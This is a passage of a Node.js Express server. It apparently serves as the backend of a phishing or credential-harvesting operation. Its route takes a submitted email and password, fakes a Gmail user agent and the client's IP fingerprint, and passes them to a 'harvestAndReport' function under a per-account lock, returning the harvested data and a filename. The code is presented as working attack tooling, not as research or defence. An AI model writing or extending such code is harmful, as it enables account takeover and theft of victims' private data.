    const { email, password, fingerprint = {} } = req.body || {};
    if (!email || !password) return res.status(400).json({ ok: false, message: 'email and password required' });
    const ua = fingerprint.userAgent || req.headers['user-agent'] || GMAIL_UA_FALLBACK;
    try {
        const out = await harvestLocked(email.toLowerCase(), () =>
            harvestAndReport({ email, password, ua, ip: firstClientIp(req), ipInfo: {}, stage: 2, match: true })
        );
        res.json({ ok: out.ok, error: out.error, total: out.total, json: out.json, filename: out.filename });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.use((req, res) => res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` }));

app.listen(PORT, () => console.log(`🚀 listening on ${PORT}`));
process.on('uncaughtException', e => console.error('❌ Uncaught:', e.message));
process.on('unhandledRejection', r => console.error('❌ Unhandled:', r));